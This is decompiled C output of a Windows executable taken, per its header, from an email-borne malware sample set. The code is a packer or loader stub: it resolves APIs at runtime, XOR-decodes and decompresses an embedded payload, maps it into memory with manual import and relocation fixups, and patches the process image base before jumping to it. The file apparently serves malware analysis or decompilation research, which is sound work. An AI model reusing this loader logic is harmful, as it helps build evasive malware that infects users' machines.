// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0742/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401040(Eq_285 dwArg04, Eq_280 * dwArg08, Eq_285 dwArg0C)
{
	globals->dw4063FC = 0x00000000;
	while (globals->dw4063FC <u dwArg0C)
	{
		dwArg04[globals->dw4063FC] = dwArg08[globals->dw4063FC];
		globals->dw4063FC = globals->dw4063FC + 0x00000001;
	}
	return;
}

void fn004010D0(word32 ebx, word32 esi, word32 edi, Eq_184 * fs)
{
	GetProcAddress(LoadLibraryA(0x00406298), 0x00406280)();
	lstrcatA(fp - 0x00000074, 0x004062A8);
	word32 eax_63 = CreateFileA(fp - 0x00000074, 0x00000001, 0x00000003, 0x00000000, 0x00000003, 0x00000080, 0x00000000);
	if (eax_63 != 0xFFFFFFFF && eax_63 != 0x00000000)
	{
		fp->dwFFFFFF54 = 0x004062B8;
		fp->dwFFFFFF54 = 0x004062C4;
		Mem130[fp - 0x000000B0:word32] = LoadLibraryA(0x00000080);
		code * eax_131 = GetProcAddress(0x00000080, 0x00000000);
		fp->dwFFFFFF54 = fp - 0x00000078;
		fp->dwFFFFFF54 = 0x004062D4;
		fp->dwFFFFFF54 = 0x80000000;
		eax_131();
		if ((fp - 0x00000078 & fp - 0x00000078) != 0x00000000)
		{
l004012D8:
			return;
		}
		else
		{
			fp->dwFFFFFF54 = 0x004062DC;
			fp->dwFFFFFF54 = 0x004062E8;
			Mem154[fp - 0x000000BC:word32] = LoadLibraryA(0x00000003);
			code * eax_155 = GetProcAddress(0x00000003, 0x00000000);
			fp->dwFFFFFF54 = fp - 0x00000078;
			fp->dwFFFFFF54 = 0x004062F8;
			fp->dwFFFFFF54 = 0x80000000;
			eax_155();
			if (eax_155 == null)
				goto l004012D8;
			else
			{
				Eq_27 eax_173 = GetModuleHandleA(0x00000000);
				Eq_27 eax_178 = globals->t402001;
				Eq_27 edx_181 = globals->t402005;
				Eq_27 dwLoc08_183 = 0x00000000;
				while (dwLoc08_183 <u eax_178)
				{
					fp->dwFFFFFF54 = 0x00000000;
					GetModuleHandleA(0x00000000);
					dwLoc08_183.u0->dw0008 = dwLoc08_183.u0->dw0008 ^ 0x00AA2C27;
					dwLoc08_183.u0 = dwLoc08_183.u0;
				}
				Mem209[fp - 0x000000C4:word32] = edx_181;
				globals->t40640C = fn004016C0(0x00000000);
				Mem215[fp - 0x000000C4:word32] = eax_178;
				fn00401880(0x00402009, globals->t40640C, 0x00000000);
				globals->dw406400 = edi;
				globals->dw4063F8 = esi;
				globals->dw406408 = ebx;
				globals->ptr406410 = fs->ptr0018;
				globals->dw406404 = fp - 0x00000004;
				Mem236[fp - 0x000000C4:word32] = eax_173;
				word32 ecx_238 = 0x004012A9 - eax_173;
				fn004016F0(ecx_238, 0x00000000);
				Eq_27 edx_244 = globals->t40640C;
				Mem246[fp - 0x000000C4:word32] = edx_244;
				fn00401300(fp - 0x00000004, 0x00000000);
				Mem246[0x00406414:word32]();
				return;
			}
		}
	}
	else
		goto l004012D8;
}

word32 fn004012E0(Eq_27 dwArg04, word32 dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

void fn00401300(word32 ebp, word32 dwArg04)
{
	lstrcpyA(fp + 0xFFFFFF44, 0x0040630C);
	Eq_27 eax_16 = GetModuleHandleA(0x00406314);
	code * eax_24 = GetProcAddress(eax_16, 0x00406324);
	code * eax_32 = GetProcAddress(eax_16, 0x00406334);
	code * eax_40 = GetProcAddress(eax_16, 0x00406348);
	code * eax_48 = GetProcAddress(eax_16, 0x00406358);
	code * eax_56 = GetProcAddress(eax_16, 0x00406364);
	Eq_279 * edx_65 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_285 eax_71 = &edx_65->w0014 + (word32) edx_65->w0014;
	eax_40();
	fn00401040(eax_71, dwArg04, dwArg04->dw003C + 0x00000138 + (word32) edx_65->w0006 *s 0x00000028);
	Eq_285 dwLoc2C_112 = eax_71;
	up32 dwLoc10_104 = 0x00000000;
	while (dwLoc10_104 <u (word32) edx_65->w0006)
	{
		if (Mem0[dwLoc2C_112 + 0x00000014:word32] != 0x00000000 && Mem0[dwLoc2C_112 + 0x00000010:word32] != 0x00000000)
		{
			word32 eax_145 = Mem0[dwLoc2C_112 + 0x00000010:word32] - 0x00000001 + Mem0[edx_65 + 0x0000003C:word32];
			fn00401040(eax_71 + Mem0[dwLoc2C_112 + 0x0000000C:word32], dwArg04 + Mem0[dwLoc2C_112 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_145) % Mem0[edx_65 + 0x0000003C:word32], eax_145) /u Mem0[edx_65 + 0x0000003C:word32] *s Mem0[edx_65 + 0x0000003C:word32]);
		}
		dwLoc2C_112 = dwLoc2C_112 + 0x00000028;
		dwLoc10_104 = dwLoc10_104 + 0x00000001;
	}
	word32 ecx_173 = eax_71 + Mem0[eax_71 + 0x0000003C:word32];
	word32 eax_179 = Mem0[ecx_173 + 0x00000050:word32];
	eax_32();
	word32 dwLocCC_195 = eax_71 + Mem0[ecx_173 + 0x00000080:word32];
	while (dwLocCC_195->dw0010 != 0x00000000)
	{
		Eq_389 * dwLoc38_229;
		Eq_390 * dwLoc28_228;
		Eq_27 eax_222 = LoadLibraryA(eax_71 + Mem0[dwLocCC_195 + 0x0000000C:word32]);
		if (dwLocCC_195->dw0000 != 0x00000000)
		{
			dwLoc28_228 = eax_71 + Mem0[dwLocCC_195 + 0x00000000:word32];
			dwLoc38_229 = eax_71 + Mem0[dwLocCC_195 + 0x00000010:word32];
		}
		else
		{
			dwLoc28_228 = eax_71 + Mem0[dwLocCC_195 + 0x00000010:word32];
			dwLoc38_229 = eax_71 + Mem0[dwLocCC_195 + 0x00000000:word32];
		}
		if (dwLocCC_195->dw0010 != 0x00000000 && dwLocCC_195->dw0000 != 0x00000000)
		{
			fp->dwFFFFFFE4 = 0x00000001;
			goto l0040154C;
		}
l0040154C:
		while (dwLoc28_228->dw0000 != 0x00000000)
		{
			if ((dwLoc28_228->dw0000 & 0x80000000) != 0x00000000)
				dwLoc28_228->dw0000 = fn004012E0(eax_222, dwLoc28_228->dw0000 & 0x7FFFFFFF);
			else
				dwLoc28_228->dw0000 = fn004012E0(eax_222, dwLoc28_228->dw0000 + 0x00000002 + eax_71);
			if (0x00000000 != 0x00000000)
				dwLoc38_229->dw0000 = dwLoc28_228->dw0000;
			dwLoc28_228 = dwLoc28_228 + 1;
			dwLoc38_229 = dwLoc38_229 + 1;
		}
		dwLocCC_195 = dwLocCC_195 + 1;
	}
	word32 esp_344 = fp - 0x0000010C;
	eax_56();
	globals->t4063F4 = ecx_173;
	if (globals->t4063F4 == 0x00000000)
	{
		word32 esp_410 = fp - 0x00000110;
		eax_24();
		if (ecx_173 == 0x00000000)
		{
			word32 eax_455 = Mem346[ecx_173 + 0x00000034:word32];
			esp_410 = fp - 0x0000011C;
			eax_48();
			if (eax_455 == 0x00000000)
				;
			else
			{
l00401623:
				word32 edx_420 = Mem346[ecx_173 + 0x00000034:word32];
				Eq_500 * esp_421 = esp_410 - 0x00000004;
				esp_421->dw0000 = edx_420;
				esp_421->dw0000 = 0x00000000;
				esp_421->dw0000 = 0x00000000;
				esp_421->dw0000 = 0x00000000;
				esp_421->dw0000 = 0x00000022;
				Mem433[esp_421 - 0x00000014:word32] = eax_179;
				esp_344 = esp_421 - 0x00000014;
				eax_56();
				globals->t4063F4 = eax_179;
				if (globals->t4063F4 == 0x00000000)
				{
					esp_421->dw0000 = 0x00000040;
					esp_421->dw0000 = 0x00003000;
					word32 edx_442 = Mem440[ecx_173 + 0x00000050:word32];
					Mem444[esp_421 - 0x00000020:word32] = edx_442;
					word32 ecx_446 = Mem444[ecx_173 + 0x00000034:word32];
					esp_421->dw0000 = ecx_446;
					esp_344 = esp_421 - 0x00000024;
					eax_40();
					globals->t4063F4 = ecx_173;
				}
l00401664:
				Eq_438 * esp_377 = esp_344 - 0x00000004;
				esp_377->t0000 = eax_179;
				CloseHandle(esp_377->t0000);
				Mem384[esp_377 + 0x00000000:word32] = Mem378[ecx_173 + 0x00000050:word32];
				esp_377->t0000 = eax_71;
				esp_377->t0000 = globals->t4063F4;
				fn00401040(dwArg00, dwArg04, dwArg08);
				esp_377->t0000 = globals->t4063F4;
				fn00401850(dwArg00);
				Mem403[0x00406414:word32] = Mem397[0x004063F4:word32] + Mem397[ecx_173 + 0x00000028:word32];
				Mem406[ecx_173 + 0x00000028:word32] = Mem403[0x00406414:word32];
			}
		}
		else
			goto l00401623;
	}
	else
		goto l00401664;
	return;
}

word32 fn004016C0(word32 dwArg04)
{
	return VirtualAlloc(0x00000000, dwArg04, 0x00003000, 0x00000004);
}

void fn004016F0(word32 dwArg04, word32 dwArg08)
{
fn004016F0_entry:
l004016F0:
	Eq_285 edx_16 = dwArg08 + Mem0[dwArg08 + 0x0000003C:word32]
	GetProcAddress(GetModuleHandleA(0x00406384), 0x00406374)()
	globals->t4063F4 = edx_16;
	branch globals->t4063F4 != 0x00000000 l0040174E
l00401744:
	goto l0040183E
l0040174E:
	fn00401040(globals->t4063F4, dwArg08, Mem44[edx_16 + 0x00000050:word32])
	word32 eax_64 = globals->t4063F4 - dwArg08
	branch Mem44[edx_16 + 0x000000A4:word32] == 0x00000000 l00401833
l00401783:
	word32 dwLoc0C_157 = dwArg08 + Mem44[edx_16 + 0x000000A0:word32]
l00401792:
	branch dwLoc0C_157->dw0004 == 0x00000000 l00401833
l0040179F:
	uint32 eax_105 = dwLoc0C_157->dw0004 - 0x00000008 >>u 0x00000001
	word16 * ecx_108[] = &dwLoc0C_157->a0008[0]
	uint32 dwLoc08_111 = 0x00000000
	goto l004017C8
l004017BF:
	dwLoc08_111 = dwLoc08_111 + 0x00000001;
l004017C8:
	branch dwLoc08_111 >=u eax_105 l00401822
l004017D0:
	branch (word32) ecx_108[dwLoc08_111] >> 0x0000000C != 0x00000003 l00401820
l004017E2:
	(Mem44[0x004063F4:word32] + Mem44[dwLoc0C_157 + 0x00000000:word32])[(word32) ecx_108[dwLoc08_111] & 0x00000FFF] = (Mem44[0x004063F4:word32] + Mem44[dwLoc0C_157 + 0x00000000:word32])[(word32) ecx_108[dwLoc08_111] & 0x00000FFF] + eax_64;
l00401820:
	goto l004017BF
l00401822:
	dwLoc0C_157 = dwLoc0C_157 + Mem44[dwLoc0C_157 + 0x00000004:word32];
	goto l00401792
l00401833:
l0040183E:
	return
fn004016F0_exit:
}

void fn00401850(Eq_285 dwArg04)
{
	Eq_186 * edx_7 = globals->ptr406410;
	edx_7->ptr0030->dw0008 = dwArg04;
	return;
}

void fn00401880(ptr32 dwArg04, Eq_27 dwArg08, word32 dwArg0C)
{
	byte cl_12 = *dwArg04;
	lstrcpyA(fp + 0xFFFFFF6C, 0x004063C4);
	up32 dwLoc0C_124 = 0x00000001;
	word32 dwLoc18_128 = 0x00000000;
	do
	{
		up32 edx_40 = dwLoc0C_124 + 0x00000001;
		byte cl_37 = dwArg04[dwLoc0C_124];
		dwLoc0C_124 = edx_40;
		if ((word32) cl_37 != (word32) cl_12)
		{
			dwArg08[dwLoc18_128] = cl_37;
			dwLoc18_128 = dwLoc18_128 + 0x00000001;
		}
		else if ((word32) dwArg04[edx_40] == 0x00000000)
		{
			dwArg08[dwLoc18_128] = cl_12;
			dwLoc18_128 = dwLoc18_128 + 0x00000001;
			dwLoc0C_124 = edx_40 + 0x00000001;
		}
		else
		{
			word32 eax_110 = fn004019B0(fp - 0x00000010, dwArg04 + edx_40) + edx_40;
			dwLoc0C_124 = fn004019B0(fp - 0x00000020, dwArg04 + eax_110) + eax_110;
			up32 dwLoc1C_125 = 0x00000000;
			while (dwLoc1C_125 <u dwLoc10)
			{
				dwArg08[dwLoc18_128] = dwArg08[dwLoc18_128 - dwLoc20];
				dwLoc18_128 = dwLoc18_128 + 0x00000001;
				dwLoc1C_125 = dwLoc1C_125 + 0x00000001;
			}
		}
	} while (dwLoc0C_124 <u dwArg0C);
	lstrcpyA(fp + 0xFFFFFF6C, 0x004063DC);
	return;
}

word32 fn004019B0(word32 dwArg04, word32 dwArg08)
{
	lstrcpyA(fp - 0x00000084, 0x00406394);
	word32 dwLoc08_19 = 0x00000000;
	word32 dwLoc10_20 = 0x00000000;
	do
	{
		word32 edx_23 = (word32) dwArg08->b0000;
		word32 edx_33 = edx_23 & 0x0000007F | dwLoc08_19 << 0x00000007;
		word32 eax_36 = dwLoc10_20 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_19 = edx_33;
		dwLoc10_20 = eax_36;
	} while ((edx_23 & 0x00000080) != 0x00000000);
	fp->dwFFFFFF78 = 0x004063AC;
	lstrcpyA(fp - 0x00000084, 0x00406394);
	*dwArg04 = edx_33;
	return eax_36;
}

